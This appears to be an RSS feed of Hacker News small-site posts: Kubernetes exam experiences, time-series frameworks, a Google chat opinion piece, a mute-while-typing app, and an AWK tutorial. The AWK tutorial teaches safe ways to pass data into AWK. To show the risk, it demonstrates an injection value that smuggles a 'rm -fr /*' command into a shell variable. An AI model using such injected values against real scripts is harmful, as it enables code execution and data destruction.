  <li>Build a bookmark folder in Chrome with relevant pages in kubernetes.io: you can use it during the exam!</li>
  <li>Seriously, read the damn questions carefully.</li>
  <li>Practice, practice and practice more.</li>
</ul>

<h3 id="the-exams">The exams</h3>
<p>The exam for any of these Kubernetes certifications consists in solving a set of tasks, in a 2 hour terminal session.</p>

<p>There are 17 scenarios/questions for CKA, and 19 for CKAD.
The whole time, a proctor is watching and listening to you via webcam and microphone, and seeing the content of your screens (you can use more than one).
You communicate with the proctor only via a live chat application which is part of the PSI interface for the exam.</p>

<p>At the beginning they will ask you to show your ID, and then you will need to show them your working area from the webcam.
You will need to show your desk, and the room youâ€™re in.
Ensure that nothing written is visibile on the walls, and that you are the only person in the room.</p>

<p>Once the exam starts, the proctor may ask you every once in a while to show your hands to the webcam.
Donâ€™t bother asking questions about the exam itself, chances are the proctor really doesnâ€™t know about the subject and is only there to ensure you donâ€™t cheat.
You will need to share your screens for the proctor to see.
If you have 2 screens you can have the exam terminal on one, and the tab with k8s docs on the other.</p>

<p>In the terminal itself, you are given 6 or so k8s clusters, and you will need to switch between them.
You will always have a command printed at the beginning of each question, for easy copy paste:</p>
<div><div><pre><code>kubectl config use-context bla
</code></pre></div></div>
<p>Make sure to <strong>use it</strong>!</p>

<p>Do not be fooled by the fact that you are able to search documentation during the exam.
The tasks that you will be given are often complex ones; time is of the essence! If you waste it while reading up docs you will not be able to complete all of the tasks in time.</p>

<h3 id="resources-used">Resources used</h3>
<ul>
  <li>Official docs <a href="https://kubernetes.io/">kubernetes.io</a></li>
  <li><a href="https://www.udemy.com/course/certified-kubernetes-administrator-with-practice-tests/">Certified Kubernetes Administrator by Mumshad Mannambeth (Udemy)</a></li>
  <li><a href="https://www.udemy.com/course/certified-kubernetes-application-developer/">Certified Kubernetes Application Developer by Mumshad Mannambeth (Udemy)</a></li>
  <li>Exam simulator <a href="https://killer.sh/">killer.sh</a></li>
  <li>Kodekloud community slack</li>
  <li>Kubernetes community slack</li>
</ul>


<ul>
  <li><a href="https://www.amazon.com/Cloud-Native-DevOps-Kubernetes-Applications/dp/1492040762/ref=sr_1_1?crid=24TO6CY3JORE4&amp;dchild=1&amp;keywords=cloud+native+devops+with+kubernetes&amp;qid=1612074068&amp;sprefix=cloud+native+dev%2Caps%2C260&amp;sr=8-1">Cloud Native Devops with Kubernetes</a>, by John Arundel and Justin Domingus.</li>
  <li><a href="https://www.amazon.com/Kubernetes-Running-Dive-Future-Infrastructure/dp/1492046531/ref=pd_bxgy_img_2/140-4642137-3991249?_encoding=UTF8&amp;pd_rd_i=1492046531&amp;pd_rd_r=9b0a86b5-7a7a-48b7-af2d-8caf1db3aeef&amp;pd_rd_w=8ickO&amp;pd_rd_wg=F4zT9&amp;pf_rd_p=f325d01c-4658-4593-be83-3e12ca663f0e&amp;pf_rd_r=GERZBQPX5AYFFCB14S8R&amp;psc=1&amp;refRID=GERZBQPX5AYFFCB14S8R">Kubernetes Up &amp; Running</a>, by Brendan Burns, Joe Beda and Kelsey Hightower.</li>
</ul>

<h2 id="cka">CKA</h2>
<p>I will start with the CKA, as it is the first exam I attempted.</p>

<h3 id="objectives">Objectives</h3>
<p>The CKA ensures we have the skillset to setup and maintain a Kubernetes cluster, and manage it by using best practices.</p>

<h3 id="requirements">Requirements</h3>
<p>As this exam is aimed at the Systems administrator/devops engineer, some linux as well as infrastructure skills are expected, such as:</p>
<ul>
  <li>Knowledge of Linux OS.</li>
  <li>Being comfortable on the terminal.</li>
  <li>Knowing how to quickly edit files with text editors like Vi/Vim.</li>
  <li>Working knowledge of networking concepts.</li>
  <li>Working knowledge of TLS encryption concepts.</li>
  <li>Working knowledge of docker and containerization concepts.</li>
</ul>

<p>A deep dive is done on Kubernetes concepts and architecture during the indicated courses.</p>

<h3 id="study-plan">Study plan</h3>
<p>I began studying around the end of September 2020, by purchasing Mumshad Mannambethâ€™s excellent Udemy course for both CKA and CKAD, both on sale at the time.
That was a major source of material for me, as the courses included access to Katacoda/Kodekloud practice labs, and access to a Slack community where the trainer and other exam-takers participated.
The videos of Mumshadâ€™s course are very well done, each in the 5-10 minute range in length, slowly and clearly explaining each concept.
I would get to practice that concept later with labs provided by Mumshadâ€™s platform, KodeKloud.</p>

<p>The course itself has a section later on where we must manually install a Kubernetes cluster from scratch on a local vagrant setup, based on <a href="https://github.com/kelseyhightower/kubernetes-the-hard-way">Kelsey Hightowerâ€™s excellent Kubernetes the Hard way project</a> (the original project leverages infrastructure on Google Cloud instead).
During the same course, we get to setup another cluster by using <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/">kubeadm</a>, which is part of the exam curriculum.</p>

<p>I would say that before taking the exam, I spent an average of about 1 hour every day watching the course videos and playing around with the labs (around 2 hours or more during weekends), for a couple months;
I took care of understanding every concept presented in the videos, and verified my knowledge with the labs and on a local cluster where I spent some practice time on, on top of study time.
I also re-did all of the course labs multiple times until I knew almost all of the answers by heart, and could get around them easily.</p>

<p>When something was unclear, the slack communities on kodekloud and kubernetes were always very helpful, always answering all of my questions, no matter how dumb I thought they were :)</p>

<p>I made sure to know <code>kubectl</code> imperative commands like the back of my hand, and building a library of bookmarks in my browser with relevant pages ready, as we are allowed an extra tab with the documentation during the exam.</p>

<p>After 2 months of that, I felt like I was ready.</p>

<h3 id="cka-exam-attempt-1">CKA Exam attempt #1</h3>
<p>I booked the exam for end of November, on a Saturday morning at 8AM, and sat for it in the guest room of my home.
The exam setup time with the proctor went pretty smoothly, and I was able to start on time.</p>

<p>I was not so confident by the end of the two hours. After 36 hours I got the news that I failed that attempt with 60% (minimum passing grade is 66%).
What went wrong for me was that I did not read/understand one specific question, which was related to ETCD backup and restore (part of the official curriculum); because of this, I ended up performing a task that effectively made one of the exam clusters unavailable.</p>

<p>Looking back, I am quite sure I invalidated several correct answers due to this mistake, which resulted in the score.
The method of how to backup/restore an ETCD cluster was also not entirely clear to me at the time, so I was not 100% sure of what I was doing.</p>

<p>Clearly I overestimated my knowledge, and depended too much on memorizing certain commands on one study platform, instead of being completely confident in all concepts and commands applied.</p>

<h3 id="new-study-plan">New study plan</h3>
<p>Enter <a href="https://killer.sh/">killer.sh</a>.
A CKA/CKAD/CKS exam simulator created by <a href="https://www.linkedin.com/in/kimwuestkamp/">Kim Wuestkampf</a>.</p>

<p>For CKA, the simulator offered 25 HARD questions to be done in 2 hours, with guided and comprehensive answers made available after the alotted time.
Such answers also offered different ways to do things, for maximized learning experience.</p>

<p>This alternative platform helped a lot in understanding things that werenâ€™t clear to me, and to practice more varied scenarios.
Completing a killer.sh simulator in under two hours gives good confidence in being able to tackle the real exam.</p>

<h3 id="cka-exam-attempt-2">CKA Exam attempt #2</h3>
<p>I booked the exam one week after getting the results of the previous one.
The exam setup experience was again pretty smooth and I was up and ready to go 10 minutes before the start time.</p>

<p>I felt pretty confident the whole time and finished up all of the questions around 1 hour and 10 minutes later.</p>

<p>The results came around 36 hours after the end of the exam, in an email.
Score was a pass with 85% :)!
As it is not possible to see the actual answers, to this day I donâ€™t really donâ€™t know what I got wrong, but am still satisfied with the result.</p>

<h2 id="ckad">CKAD</h2>
<p>I took the CKAD exam while the knowledge of the previous training was still fresh, so I felt like I had an easier time with this one.</p>

<h3 id="objectives-1">Objectives</h3>
<p>To be able to efficiently design and implement working kubernetes production workloads.</p>

<h3 id="requirements-1">Requirements</h3>
<p>Not so much system administration knowledge, but more focus on k8s concepts, architecture and best practices.
Actual programming experience is not required for the exam (although in â€œreal lifeâ€� it will probably not hurt either ;) ).</p>

<h3 id="study-plan-1">Study plan</h3>
<p>I booked the CKAD exam roughly for 3 weeks after passing the CKA.
In those 3 weeks, I took my time and spent again around 30min to 1 hour a day on Mumshadâ€™s course and labs.</p>

<p>When exam time was closer, I booked two sessions on killer.sh and focused on practicing there.
I challenged myself by finishing all the questions under 2 hours, and afterwards going through slowly through the answers section on the site.
This was very helpful and allowed me to learn different, more effective approaches.</p>

<h3 id="ckad-exam-attempt-1">CKAD Exam attempt #1</h3>
<p>I once again took the exam from the guest room in my home.</p>

<p>This time the exam setup with the proctor wasnâ€™t so smooth.
The connection from my end and theirs wasnâ€™t great, and we kept getting disconnected from the session. Webcam images werenâ€™t so clear so they had to ask me to show identification more than once. It took about 40 minutes to start the actual exam, and that did get me a bit stressed out.</p>

<p>Nevertheless, I felt comfortable and finished all the questions in about 1 hour and a half.
36 hours later, I got the email with the good news of a pass with 83%.
Doing the CKA before really helped with the whole experience.</p>

<h2 id="conclusion">Conclusion</h2>
<p>From my experience, I would say that the hardest exam was the one for CKA, as it didnâ€™t just go through the new knowledge of k8s concepts, but also on existing understanding of systems administration.
I felt like doing CKAD immediately afterwards made it a bit easier, as the knowledge was still fresh.</p>

<p>The CKAD questions however were much more time consuming, in the sense that one task would require to perform several smaller tasks quickly, building a workload and making sure everything works together.</p>

<p>All in all, I feel the time trying to tackle these certifications was well spent; since the exams are performance based, they are fair in what they expect …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.cuffaro.com/blog/2021/01/24/cka-ckad">https://blog.cuffaro.com/blog/2021/01/24/cka-ckad</a></em></p>]]>
            </description>
            <link>https://blog.cuffaro.com/blog/2021/01/24/cka-ckad</link>
            <guid isPermaLink="false">hacker-news-small-sites-25976625</guid>
            <pubDate>Sun, 31 Jan 2021 06:37:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Japan API – Free and Open Data]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25976575">thread link</a>) | @irevenko
<br/>
January 30, 2021 | https://japan-api.github.io/docs/ | <a href="https://web.archive.org/web/*/https://japan-api.github.io/docs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://japan-api.github.io/docs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25976575</guid>
            <pubDate>Sun, 31 Jan 2021 06:26:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Deep Learning for Time Series Frameworks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25976337">thread link</a>) | @rsvpdd2
<br/>
January 30, 2021 | http://pytorchforecasting.com/2021/01/deep-learning-for-time-series-forecasting-frameworks-2021/ | <a href="https://web.archive.org/web/*/http://pytorchforecasting.com/2021/01/deep-learning-for-time-series-forecasting-frameworks-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-13">

	

	<div>
		
<p>In this post we will look at some of the top open source deep learning for time series forecasting frameworks. In particular we will look at PyTorch time series forecasting frameworks.</p>



<ol><li><a href="https://github.com/awslabs/gluon-ts">Gluon</a> This framework by Amazon remains one of the top DL based time series forecasting frameworks on GitHub. However, there are some down sides including lock-in to MXNet (a rather obscure architecture). The repository also doesn’t seem to be quick at adding new research. </li><li><a href="https://github.com/AIStream-Peelout/flow-forecast">Flow Forecast</a>: This is an upcoming PyTorch based deep learning for time series forecasting framework. The repository features a lot of recent models out of research conferences along with an easy to use deployment API. The repository is one of the few repositories to have new research models, coverage tests, and interpretability metrics. </li><li><a href="https://github.com/sktime/sktime-dl">sktime dl</a> This is another time series forecasting repository. Unfortunately it looks like particularly recent activity has diminished on it. On the main page it looks </li><li><a href="https://github.com/zalandoresearch/pytorch-ts">PyTorch-TS</a> Another framework, written in PyTorch, this repository focuses more on probabilistic models. The repository isn’t that active (last commit was in November). However, the group behind it appears active in the research community and adds newer models to it. </li></ol>



<p>These seem to be the major time series forecasting framework out there at moment. Interestingly at present there doesn’t seem to be a time series forecasting built exclusively in Tensorflow/Keras. However there are <a href="https://www.tensorflow.org/tutorials/structured_data/time_series">several tutorials</a> out there.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>http://pytorchforecasting.com/2021/01/deep-learning-for-time-series-forecasting-frameworks-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25976337</guid>
            <pubDate>Sun, 31 Jan 2021 05:35:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Google needs to build an open chat client like Elemen]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25976275">thread link</a>) | @rukshn
<br/>
January 30, 2021 | https://ruky.me/2021/01/31/why-google-needs-to-build-an-open-chat-client-like-element/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/31/why-google-needs-to-build-an-open-chat-client-like-element/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Google recently blocked the Matrix based chat app Element from the Play Store sighting sexual content on the platform. It’s really hard to define the explanation because WhatsApp, Telegram users of other chat clients also share the same content. Telegram is also known to host groups sharing pirated content as well.</p>
<p>This post is not going to bash Google on the ban of Element. It’s about how Google can win the chat app </p>
<p>Chat apps have been hot for the past couple of years. When I initially Tweeted that chat apps are the new social network, 6-7 years ago (I wish if I can find that tweet, but I can’t seem to find it, maybe it was lost when I deleted all my tweets sometime ago), I remember how people laughed replying how can that even possible, but now as Facebook is on the decline, chat apps are the goto place to hang out with friends.</p>
<p>Google currently doesn’t have a house in the chat app race. Google tried with several chat applications, like Ello, Hangout, Google Talk, none of them took off. Even though Ello looked promising, and was integrated into Android, people never jumped the ship to Ello. And since Google now allowing several chat/video platforms like Hangout, Meet etc, Google’s direction in communication platform seems big vague.</p>
<p>Google also has had a poor history with social networking, Google does not have social in their DNA, it feels like they are engineering, technology first in their approach, while Facebook feels more social first than anything else.</p>
<p>However, after seeing this ban I feel what Google should have a horse in the chat app race, and it should be a matrix/element based chat client. Allow me to explain,</p>
<p>Google should embrace an open protocol like Matrix and build a chat client on top of it, yes it’s against their pattern of hoarding data, and usage of open protocol.</p>
<p>But Google was able to win the email, the email protocol is an open protocol, anyone can implement it, anyone can use any client they want, but still Google was able to create the most popular email service available out their, and even monetise it. </p>
<p>Before Google started gmail, services like hotmail only allowed 200mb of storage, I remember Yahoo deleting my email account because I didn’t login for 6 months (I was still schooling at that time, and didn’t use email much), and not to mention Yahoo, and hotmail had atrocious ads on their email service. But google changed all that, they gave a better UI, more storage, and even a better ad experience.</p>
<p>So what makes then incapable of using an open chat protocol and build a great experience around it? With engineers and money to back a project like that Google can build a good chat service around an open chat protocol.</p>
<p>Even ads might not be a thing, Google can still provide enterprise chat service to organisations, powered by their data servers. They can even keep their source closed if they want to, like they are doing with Gmail, but an open source client would be great.</p>
<p>And Google’s backing for a open chat platform will make people interested about it, and even more people will use it just because it’s from Google. People will be able to use their own clients like Element, or another Matrix client, still and users can build a network greater than a centralised chat service, like we use gmail in our mail app to chat with someone else with a different email provider. </p>
<p>And the bottom line is Facebook, Telegram, Signal, and other chat platforms are going on a race without Google, all providing a centralised experience, with the exception of Signal, who is providing a semi-centralised experience. So even if you can’t beat them, why not try to destroy them all with an open chat protocol?</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/31/why-google-needs-to-build-an-open-chat-client-like-element/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25976275</guid>
            <pubDate>Sun, 31 Jan 2021 05:24:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[QuietKeys – win32/C++ native sys tray app to automatically mute mic while typing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25976273">thread link</a>) | @jfdi
<br/>
January 30, 2021 | https://www.thomaswilley.com/2021/01/28/introducing-quietkeys-a-tiny-app-to-make-conf-calls-a-little-nicer/ | <a href="https://web.archive.org/web/*/https://www.thomaswilley.com/2021/01/28/introducing-quietkeys-a-tiny-app-to-make-conf-calls-a-little-nicer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>
    
    <p><span>January 28, 2021</span></p><p><a href="https://github.com/thomaswilley/quietkeysapp"><img alt="QuietKeys *inline *line-height" src="https://raw.githubusercontent.com/thomaswilley/quietkeysapp/master/Icons/Source/mic-fill.png"> QuietKeys</a> is a tiny app for Windows that
automatically mutes your <span>PC</span>’s mic when you type. If you’re on a conf call and
you can hear someone’s typing - send them the link to install&nbsp;QuietKeys!</p>
<p><img alt="QuietKeys Demo" src="https://raw.githubusercontent.com/thomaswilley/quietkeysapp/master/quietkeys_demo.gif"></p>
<p>If you’re on a conf call and you can hear someone’s typing - send them the link
to install QuietKeys! Hope this helps make calls from the <span>PC</span> a little bit&nbsp;nicer.</p>
<p>QuietKeys is written in win32/C++/C as a native windows application. Basically,
it’s a tiny file, runs super fast, and sips very little battery - so you won’t
even notice it’s there in the background. QuietKeys is a single executable
(quietkeysapp.exe) which can be set to automatically run at startup. The
QuietKeys app lives down in the system tray alongside your wifi icon, battery %
icon, etc. Left-click the icon to toggle whether QuietKeys is enabled or
disabled. Right-click to manage the&nbsp;app.</p>
<p>QuietKeys is an Increment project (<a href="https://increment.me/">https://increment.me</a>) - I’d welcome your <a href="https://www.increment.me/tw/feedback/feedback-about-quietkeys/">feedback</a>!</p>
<p>The full source is on Github and you can download a pre-compiled binary or compile it yourself.
<a href="https://github.com/thomaswilley/quietkeysapp">Get QuietKeys&nbsp;Now</a></p>
  </div>
</div>
      </div></div>]]>
            </description>
            <link>https://www.thomaswilley.com/2021/01/28/introducing-quietkeys-a-tiny-app-to-make-conf-calls-a-little-nicer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25976273</guid>
            <pubDate>Sun, 31 Jan 2021 05:23:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Passing Runtime Data to Awk]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25975788">thread link</a>) | @signa11
<br/>
January 30, 2021 | https://blog.sanctum.geek.nz/passing-runtime-data-to-awk/ | <a href="https://web.archive.org/web/*/https://blog.sanctum.geek.nz/passing-runtime-data-to-awk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Shell script and AWK are very complementary languages.  AWK was designed from
its very beginnings at Bell Labs as a pattern-action language for short
programs, ideally one or two lines long.  It was intended to be used on the
Unix shell interactive command line, or in shell scripts.  Its feature set
filled out some functionality that shell script at the time lacked, and often
still lacks, as is the case with floating point numbers; it thereby
(indirectly) brings much of the C language’s expressive power to the shell.</p>

<p>It’s therefore both common and reasonable to see AWK one-liners in shell
scripts for data processing where doing the same in shell is unwieldy or
impossible, especially when floating point operations or data delimiting are
involved.  While AWK’s full power is in general tragically underused, most
shell script users and developers know about one of its most useful properties:
selecting a single column from whitespace-delimited data.  Sometimes,
<a href="https://www.man7.org/linux/man-pages/man1/cut.1p.html"><code>cut(1)</code></a> doesn’t, uh, cut it.</p>

<p>In order for one language to cooperate with another usefully via embedded
programs in this way, data of some sort needs to be passed between them at
runtime, and here there are a few traps with syntax that may catch out unwary
shell programmers.  We’ll go through a simple example showing the problems, and
demonstrate a few potential solutions.</p>

<h2>Easy: Fixed data</h2>

<p>Embedded AWK programs in shell scripts work great when you already know
<em>before</em> runtime what you want your patterns for the pattern-action pairs to
be.  Suppose our company has a vendor-supplied program that returns temperature
sensor data for the server room, and we want to run some commands for any and
all rows registering over a certain threshold temperature.  The output for the
existing <code>server-room-temps</code> command might look like this:</p>

<pre><code>$ server-room-temps
ID  Location    Temperature_C
1   hot_aisle_1 27.9
2   hot_aisle_2 30.3
3   cold_aisle_1    26.0
4   cold_aisle_2    25.2
5   outer       23.9
</code></pre>

<p>The task for the monitoring script is simple: get a list of all the locations
where the temperature is above 28°C.  If there are any such locations, we need
to email the administrator the full list.  Easy!  It looks like every
introductory AWK example you’ve ever seen—it could be straight out of <a href="https://www.amazon.com/AWK-Programming-Language-Alfred-Aho/dp/020107981X">the
book</a>.  Let’s type it up on the shell to test it:</p>

<pre><code>$ server-room-temps | awk 'NR &gt; 1 &amp;&amp; $3 &gt; 28 {print $2}'
hot_aisle_2
</code></pre>

<p>That looks good.  The script might end up looking something like this:</p>

<pre><code>#!/bin/sh
alerts=/var/cache/temps/alerts
server-room-temps |
    awk 'NR &gt; 1 &amp;&amp; $3 &gt; 28 {print $2}' &gt; "$alerts" || exit
if [ -s "$alerts" ] ; then
    mail -s 'Temperature alert' sysadmin &lt; "$alerts"
fi
</code></pre>

<p>So, after writing the alerts data file, we test if with <code>[ -s ... ]</code> to see
whether it’s got any data in it.  If it does, we send it all to the
administrator with <code>mail(1)</code>.  Done!</p>

<p>We set that running every few minutes with <code>cron(8)</code> or <code>systemd.timer(5)</code>, and
we have a nice stop-gap solution until the lazy systems administrator gets
around to fixing the Nagios server.  He’s probably just off playing
<a href="https://www.adom.de/home/index.html">ADOM</a> again…</p>

<h2>Hard: runtime data</h2>

<p>A few weeks later, our sysadmin still hasn’t got the Nagios server running,
because his high elf wizard is about to hit level 50, and there’s a new request
from the boss: can we adjust the script so that it accepts the cutoff
temperature data as an argument, and other departments can use it?  Sure, why
not.  Let’s mock that up, with a threshold of, let’s say, 25.5°C.</p>

<pre><code>$ server-room-temps &gt; test-data
$ threshold=25.5
$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; $threshold {print $2}' test-data
hot_aisle_1
hot_aisle_2
</code></pre>

<p>Wait, that’s not right.  There are <em>three</em> lines with temperatures over 25.5°C,
not two.  Where’s <code>cold_aisle_1</code>?</p>

<p>Looking at the code more carefully, you realize that you assumed your shell
variable would be accessible from within the AWK program, when of course, it
isn’t; AWK’s variables are independent of shell variables.  You don’t know why
the hell it’s showing those two rows, though…</p>

<p>Maybe we need double quotes?</p>

<pre><code>$ awk "NR &gt; 1 &amp;&amp; $3 &gt; $threshold {print $2}" test-data
awk: cmd. line:1: NR &gt; 1 &amp;&amp;  &gt; 25.5 {print}
awk: cmd. line:1:            ^ syntax error
</code></pre>

<p>Hmm.  Nope.  Maybe we need to expand the variable inside the quotes?</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; "$threshold" {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
cold-aisle-2
outer
</code></pre>

<p>That’s not right, either.  It seems to have printed <em>all</em> the locations, as if
it didn’t test the threshold at all.</p>

<p>Maybe it should be <em>outside</em> the single quotes?</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; '$threshold' {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>The results look right, now … ah, but wait, we still need to <a href="https://mywiki.wooledge.org/Quotes">quote it to
stop spaces expanding</a>…</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; '"$threshold"' {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>Cool, that works.  Let’s submit it to the security team and go to lunch.</p>

<h3>Caught out</h3>

<p>To your surprise, the script is rejected.  The security officer says you have
an unescaped variable that allows arbitrary code execution.  What?  Where?
It’s just AWK, not SQL…!</p>

<p>To your horror, the security officer demonstrates:</p>

<pre><code>$ threshold='0;{system("echo rm -fr /*");exit}'
$ echo 'NR &gt; 1 &amp;&amp; $3 &gt; '"$threshold"' {print $2}'
NR &gt; 1 &amp;&amp; $3 &gt; 0;{system("echo rm -fr /*");exit} {print $2}
$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; '"$threshold"' {print $2}' test-data
rm -fr /bin /boot /dev /etc /home /initrd.img ...
</code></pre>

<p>Oh, hell… if that were installed, and someone were able to set <code>threshold</code> to
an arbitrary value, they could execute <em>any</em> AWK code, and thereby shell
script, that they wanted to.  It’s <em>AWK injection</em>!  How embarrassing—good
thing that was never going to run as <code>root</code> (…right?)  Back to the drawing
board …</p>

<h3>Validating the data</h3>

<p>One approach that might come readily to mind is to ensure that no unexpected
characters appear in the value.  We could use a <code>case</code> statement before
interpolating the variable into the AWK program to check it contains no
characters outside digits and a decimal:</p>

<pre><code>case $threshold in
    *[!0-9.]*) exit 2 ;;
esac
</code></pre>

<p>That works just fine, and it’s appropriate to do some data validation at the
opening of the script, anyway.  It’s certainly better than leaving it as it
was.  But we <a href="https://en.wikipedia.org/wiki/SQL_injection">learned this lesson</a> with PHP in the 90s; you don’t just
filter on characters, or slap in some backslashes—that’s missing the point.
Ideally, we need to safely pass the data into the AWK process <em>without</em> ever
parsing it as AWK code, sanitized or nay, so the situation doesn’t arise in the
first place.</p>

<h3>Environment variables</h3>

<p>The shell and your embedded AWK program may not share the shell’s local
variables, but they <em>do</em> share environment variables, accessible in AWK’s
<code>ENVIRON</code> array.  So, passing the threshold in as an environment variable
works:</p>

<pre><code>$ THRESHOLD=25.5
$ export THRESHOLD
$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; ENVIRON["THRESHOLD"] {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>Or, to be a little cleaner:</p>

<pre><code>$ THRESHOLD=25.5 \
    awk 'NR &gt; 1 &amp;&amp; $3 &gt; ENVIRON["THRESHOLD"] {print $2}' test-data
hot-aisle-1
hot-aisle-2
cold-aisle-1
</code></pre>

<p>This is already much better.  AWK will parse our data <em>only</em> as a variable, and
won’t try to execute anything within it.  The only snag with this method is
picking a name; make sure that you don’t overwrite another, more important
environment variable, like <code>PATH</code>, or <code>LANG</code>…</p>

<h3>Another argument</h3>

<p>Passing the data as another <em>argument</em> and then reading it out of the <code>ARGV</code>
array works, too:</p>

<pre><code>$ awk 'BEGIN{ARGC--} NR &gt; 1 &amp;&amp; $3 &gt; ARGV[2] {print $2}' test-data 25.5
</code></pre>

<p>This method is also safe from arbitrary code execution, but it’s still somewhat
awkward because it requires us to decrease the argument count <code>ARGC</code> by one so
that AWK doesn’t try to process a file named “25.5” and end up upset when it’s
not there.  AWK arguments can mean whatever you need them to mean, but unless
told otherwise, AWK generally assumes they are filenames, and will attempt to
iterate through them for lines of data to chew on.</p>

<p>Here’s another way that’s very similar; we read the threshold from the second
argument, and then blank it out in the <code>ARGV</code> array:</p>

<pre><code>$ awk 'BEGIN{threshold=ARGV[2];ARGV[2]=""}
    NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' test-data 25.5
</code></pre>

<p>AWK won’t treat the second argument as a filename, because it’s blank by the
time it processes it.</p>

<h3>Pre-assigned variables</h3>

<p>There are two lesser-known syntaxes for passing data into AWK that allow you
safely to assign variables at runtime.  The first is to use the <code>-v</code> option:</p>

<pre><code>$ awk -v threshold="$threshold" \
    'NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' \
    test-data
</code></pre>

<p>Another, perhaps even more obscure, is to set them as arguments before the
filename data, using the <code>var=value</code> syntax:</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' \
    threshold="$threshold" test-data
</code></pre>

<p>Note that in both cases, we still <em>quote</em> the <code>$threshold</code> expansion; this is
because the shell is expanding the value before we pass it in.</p>

<p>The difference between these two syntaxes is when the variable assignment
occurs.  With <code>-v</code>, the assignment happens straight away, before reading any
data from the input sources, as if it were in the <code>BEGIN</code> block of the program.
With the argument form, it happens when the program’s data processing reaches
that argument.  The upshot of that is that you could test several files with
several different temperatures in one hit, if you wanted to:</p>

<pre><code>$ awk 'NR &gt; 1 &amp;&amp; $3 &gt; threshold {print $2}' \
    threshold=25.5 test-data-1 threshold=26.0 test-data-2
</code></pre>

<p>Both of these assignment syntaxes are standardized in <a href="https://www.man7.org/linux/man-pages/man1/awk.1p.html">POSIX <code>awk</code></a>.</p>

<p>These are my preferred methods for passing runtime data; they require no
argument count munging, avoid the possibility of trampling on existing
environment variables, use AWK’s own variable and expression syntax, and most
importantly, the chances of anyone reading the script being able to grasp
what’s going on are higher.  You can thereby avoid a mess of quoting and
back-ticking that often plagues these sorts of embedded programs.</p>

<h2>Safety not guaranteed</h2>

<p>If you take away only one thing from this …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.sanctum.geek.nz/passing-runtime-data-to-awk/">https://blog.sanctum.geek.nz/passing-runtime-data-to-awk/</a></em></p>]]>
            </description>
            <link>https://blog.sanctum.geek.nz/passing-runtime-data-to-awk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25975788</guid>
            <pubDate>Sun, 31 Jan 2021 04:03:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This is how Google will collapse]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25975560">thread link</a>) | @partingshots
<br/>
January 30, 2021 | https://empirics.asia/this-is-how-google-will-collapse/ | <a href="https://web.archive.org/web/*/https://empirics.asia/this-is-how-google-will-collapse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p id="473e">Google made almost all its money from ads. It was a booming business — until it wasn’t. Here’s how things looked right before the most spectacular crash the technology industry had ever seen.</p><h3 id="816d">The crumbling of Google’s cornerstone</h3><p id="ce3a">Search was Google’s only unambiguous win, as well as its <a href="https://www.cnbc.com/2017/01/26/googlealphabet-reports-fourth-quarter-2016-earnings-q4.html" target="_blank" rel="noopener" data-href="http://www.cnbc.com/2017/01/26/googlealphabet-reports-fourth-quarter-2016-earnings-q4.html">primary source of revenue</a>, so when Amazon <a href="https://www.geekwire.com/2017/amazon-continues-grow-lead-google-starting-point-online-shoppers/" target="_blank" rel="noopener" data-href="http://www.geekwire.com/2017/amazon-continues-grow-lead-google-starting-point-online-shoppers/">rapidly surpassed Google</a> as the top product search destination, Google’s foundations began to falter. <span data-creator-ids="anon">As <a href="https://techcrunch.com/2016/08/11/google-isnt-safe-from-yahoos-fate/" target="_blank" rel="noopener" 